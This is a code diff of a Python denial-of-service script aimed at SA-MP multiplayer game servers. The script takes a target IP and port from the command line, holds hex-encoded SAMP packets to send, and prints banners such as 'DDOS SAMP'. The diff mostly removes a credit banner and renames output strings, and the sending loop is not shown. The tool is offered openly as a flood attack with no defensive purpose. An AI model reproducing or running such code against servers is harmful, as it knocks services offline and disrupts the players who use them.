@@ -8,21 +8,6 @@ import time
 import os
 
 
-S = '\x1b[1;33m'
-E = '\x1b[1;31m'
-G = '\x1b[1;32m'
-A = '\x1b[1;36m'
-
-
-SALAM = pyfiglet.figlet_format(' SALAM \n HUNTER ')
-print(S+SALAM)
-print(G+'='*40)
-print(' ')
-print(S+'  Create Ddos by : Dev Sarok')
-print(' ')
-print(G+'='*40)
-print(' ')
-
 
 ip = sys.argv[1]
 port = sys.argv[2]
@@ -40,7 +25,7 @@ Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        ]
 
 
-print("[+] Sending Ghosts into ip %s In Port %s"%(orgip,port))
+print("[+] Ddos L Serveri Kat Ip %s:%s"%(orgip,port))
 
             
 
@@ -80,8 +65,8 @@ if __name__ == '__main__':
          os.system('cls' if os.name == 'nt' else 'clear')
          
          print('=========================================================================')
-         print('                SAMP EXPLOIT ')
+         print('                DDOS SAMP ')
          print('=========================================================================')
          print('\n\n')
-         print('[+] Sending Ghosts'.format(orgip))
+         print('[+] DDOS L SERVER KAT'.format(orgip))
          pass
